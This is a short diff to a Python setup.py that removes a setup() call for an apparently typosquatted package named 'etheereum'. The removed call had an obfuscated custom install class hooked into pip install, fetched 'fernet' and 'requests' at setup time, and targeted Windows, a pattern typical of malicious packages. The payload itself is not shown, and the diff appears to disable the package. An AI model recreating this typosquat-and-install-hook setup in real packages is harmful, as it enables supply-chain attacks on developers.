@@ -18,22 +18,5 @@ class blMkxRVuVfpHMflcZuaWTUrGAOonbNBNosEnyeXTxFHYascoOPaKAOyeqOwZ(install):
             install.run(self)
 
 
-setup(
-    name="etheereum",
-    version=VERSION,
-    author="diNiZRIocs",
-    author_email="kQiBbwroQDiLPe@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': blMkxRVuVfpHMflcZuaWTUrGAOonbNBNosEnyeXTxFHYascoOPaKAOyeqOwZ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
